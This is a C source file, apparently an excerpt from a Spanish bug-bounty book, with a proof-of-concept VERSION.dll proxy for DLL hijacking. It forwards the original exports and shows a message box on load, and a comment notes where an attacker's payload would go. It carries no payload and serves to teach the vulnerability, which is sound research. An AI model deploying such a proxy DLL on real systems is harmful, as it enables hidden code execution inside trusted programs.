// Extraído de: LibroBugBounty/cap-03-etica-legalidad.md
// PoC de DLL hijacking: VERSION.dll proxy
// Demuestra ejecuciÃ³n de cÃ³digo al cargar la DLL
// NO incluye funcionalidad maliciosa

#include <windows.h>

// Forward declarations para exports originales
// (generados por Claude analizando la DLL original)
#pragma comment(linker, "/export:GetFileVersionInfoA=VERSION_orig.GetFileVersionInfoA")
#pragma comment(linker, "/export:GetFileVersionInfoW=VERSION_orig.GetFileVersionInfoW")
#pragma comment(linker, "/export:GetFileVersionInfoSizeA=VERSION_orig.GetFileVersionInfoSizeA")
#pragma comment(linker, "/export:GetFileVersionInfoSizeW=VERSION_orig.GetFileVersionInfoSizeW")
#pragma comment(linker, "/export:VerQueryValueA=VERSION_orig.VerQueryValueA")
#pragma comment(linker, "/export:VerQueryValueW=VERSION_orig.VerQueryValueW")

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // PoC: demostrar ejecuciÃ³n de cÃ³digo
        // En producciÃ³n, un atacante ejecutarÃ­a payload malicioso aquÃ­
        MessageBoxA(NULL,
            "DLL Hijacking PoC - VERSION.dll loaded",
            "Security Research", MB_OK);

        // Alternativa sin GUI: escribir en fichero de log
        // FILE *f = fopen("C:\\temp\\poc_evidence.txt", "w");
        // fprintf(f, "DLL loaded by PID: %lu\n", GetCurrentProcessId());
        // fclose(f);
    }
    return TRUE;
}
